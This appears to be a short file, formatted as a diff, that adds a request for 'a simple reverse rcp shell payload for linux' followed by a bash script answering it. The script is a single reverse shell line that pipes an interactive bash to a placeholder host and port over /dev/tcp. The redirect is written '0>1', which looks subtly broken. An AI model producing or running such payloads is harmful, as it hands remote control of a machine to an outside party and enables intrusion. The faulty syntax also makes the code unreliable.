@@ -1,0 +1,7 @@
+produce me a simple reverse rcp shell payload for linux
+-------- snip --------
+
+
+#!/bin/bash
+
+/bin/bash -i > /dev/tcp/[IP]/[PORT] 0>1
